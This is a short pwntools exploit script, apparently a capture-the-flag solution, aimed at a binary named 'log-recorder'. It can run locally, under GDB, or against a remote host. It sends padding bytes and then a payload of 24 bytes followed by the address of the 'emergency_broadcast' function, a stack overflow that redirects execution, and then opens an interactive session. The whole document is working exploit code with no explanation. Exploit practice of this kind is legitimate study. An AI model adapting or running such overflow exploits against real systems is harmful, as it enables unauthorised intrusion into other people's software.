#!/usr/bin/python3
from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB: 
        return gdb.debug([exe] + argv, gdbscript="c", *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

exe = './log-recorder'
elf = context.binary = ELF(exe, checksec=False)
#context.log_level = 'debug'

#libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

io = start()

io.send(b"A"*24 + b"\x41")

payload = 24*b"B" + p64(elf.sym.emergency_broadcast)

io.send(payload)

io.interactive()